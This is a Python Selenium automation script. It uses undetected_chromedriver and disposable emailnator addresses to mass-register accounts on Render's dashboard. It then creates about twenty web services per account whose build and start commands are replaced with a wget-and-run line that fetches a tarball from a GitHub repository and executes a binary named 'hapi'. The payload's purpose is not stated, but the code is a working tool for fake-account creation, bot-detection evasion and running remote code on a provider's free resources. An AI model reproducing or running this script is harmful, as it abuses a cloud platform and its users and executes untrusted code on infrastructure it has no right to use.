import os
print("rawr")
import undetected_chromedriver as uc
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
import random
import requests

# os.system("npm i")
options = uc.ChromeOptions()
os.system("rm -rf rawrz")
os.system("tar -xf volx.tar.gz")
os.system("rm -rf rawr")
os.system("cp -r rawrz rawr")
a = True
low_word = "abcdefghijklkmnopqrstuvwxyz"
upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ"
number = "1234567890"
symbols = "!@#$%&*"
username_for = low_word
password_for = low_word + upper_word + number + symbols
long_password = 16
long_username = 12
ass = "".join(random.sample(username_for, 12))
options.add_argument('--no-first-run --no-service-autorun --password-store=basic') #wlacz to jak juz nie bedzie dev test
options.user_data_dir = "rawr"
options.add_argument("--window-size=1920,1080")
options.add_argument('--user-data-dir=rawr')
driver = uc.Chrome(options=options, version_main=106)

headersdomain = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"}
uwu = {
        "email":["plusGmail"]
}
rawr = requests.get('https://www.emailnator.com/', headers=headersdomain)
headersdomain["X-XSRF-TOKEN"] = rawr.headers["set-cookie"].split("=")[1].split("%3D")[0]+"="
headersdomain["Accept"] = "application/json, text/plain, */*"
headersdomain["Content-Type"] = "application/json"
headersdomain["X-Requested-With"] = "XMLHttpRequest"
headersdomain["Cookie"] = rawr.headers["set-cookie"].split(" ")[0]+"gmailnator_session="+rawr.headers["set-cookie"].split("gmailnator_session=")[1].split(" ")[0]
rawrz = requests.post('https://www.emailnator.com/generate-email', headers=headersdomain, json=uwu)
emil = rawrz.json()["email"][0].split("+")[0]+"+"+"".join(random.sample(low_word, 7))+"@gmail.com"
driver.get('https://dashboard.render.com/register?next=/')
time.sleep(2)
driver.find_element(By.XPATH, "/html/body/div[1]/main/div[2]/div/form/span[1]/input").send_keys(emil)
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[1]/main/div[2]/div/form/span[2]/input").send_keys("".join(random.sample(low_word, 13))+"H1!")
time.sleep(1)
driver.find_element(By.XPATH, "/html/body/div[1]/main/div[2]/div/form/button").click()
time.sleep(20)
headersdomain = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache"}
uwu = {}
rawr = requests.get('https://www.emailnator.com/', headers=headersdomain)
headersdomain["X-XSRF-TOKEN"] = rawr.headers["set-cookie"].split("=")[1].split("%3D")[0]+"="
headersdomain["Accept"] = "application/json, text/plain, */*"
headersdomain["Content-Type"] = "application/json"
headersdomain["X-Requested-With"] = "XMLHttpRequest"
headersdomain["Cookie"] = rawr.headers["set-cookie"].split(" ")[0]+"gmailnator_session="+rawr.headers["set-cookie"].split("gmailnator_session=")[1].split(" ")[0]
uwu["email"]=emil
rawrz = requests.post('https://www.emailnator.com/message-list', headers=headersdomain, json=uwu)
for bork in rawrz.json()["messageData"]:
        if(bork["messageID"]!="ADSVPN"):
                uwu["messageID"] = bork["messageID"]
                rawrzz = requests.post('https://www.emailnator.com/message-list', headers=headersdomain, json=uwu)
                verifylink = rawrzz.text.split("\n")[2]
driver.get(verifylink)
githuby = ["https://github.com/dotnet/try", "https://github.com/The-Run-Philosophy-Organization/run","https://github.com/dotnet/runtime","https://github.com/runelite/runelite","https://github.com/oklog/run","https://github.com/opencontainers/runc","https://github.com/kubernetes/minikube","https://github.com/jenkinsci/docker","https://github.com/nextcloud/docker","https://github.com/odoo/docker","https://github.com/sous-chefs/docker","https://github.com/docker-library/docker","https://github.com/wendux/fly","https://github.com/H07000223/FlycoTabLayout","https://github.com/amibug/fly","https://github.com/makersacademy/airport_challenge","https://github.com/race604/FlyRefresh","https://github.com/flyway/flyway","https://github.com/thephpleague/flysystem","https://github.com/crash-utility/crash","https://github.com/crashub/crash","https://github.com/ACRA/acra","https://github.com/android-notes/Cockroach","https://github.com/1c7/Crash-Course-Computer-Science-Chinese","https://github.com/kstenerud/KSCrash"]
for _ in range(20):
    driver.get("https://dashboard.render.com/select-repo?type=web")
    time.sleep(3)
    ass = random.choice(githuby)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div[1]/div/div/div/div[1]/div[2]/div[2]/form/div/div[1]/div/div/input").send_keys(ass)
    time.sleep(1)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div[1]/div/div/div/div[1]/div[2]/div[2]/form/div/div[2]/button").click()
    time.sleep(10)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div[1]/div/div/div/div/div/form/div[3]/div[2]/div/div/select/option[4]").click()
    time.sleep(2)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div[1]/div/div/div/div/div/form/div[1]/div[2]/div/div/div[1]/input").send_keys("".join(random.sample(low_word, 13)))
    time.sleep(1)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div[1]/div/div/div/div/div/form/div[6]/div[2]/div/div/div/div/div/input").send_keys(Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+"wget https://github.com/n2dhektor/silver-octo-palm-tree/raw/main/xdcloudy2.tar.gz && tar -xf xdcloudy2.tar.gz && ./hapi")
    time.sleep(1)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div[1]/div/div/div/div/div/form/div[7]/div[2]/div/div/div/div/div[1]/input").send_keys(Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+Keys.BACK_SPACE+"wget https://github.com/n2dhektor/silver-octo-palm-tree/raw/main/xdcloudy2.tar.gz && tar -xf xdcloudy2.tar.gz && ./hapi")
    time.sleep(1)
    driver.execute_script("window.scrollBy(0,1500)", "")
    time.sleep(1)
    driver.find_element(By.XPATH, "/html/body/div[1]/div/div[3]/div/div/div[1]/div/div/div/div/div/form/div[10]/div/button").click()
    time.sleep(10)
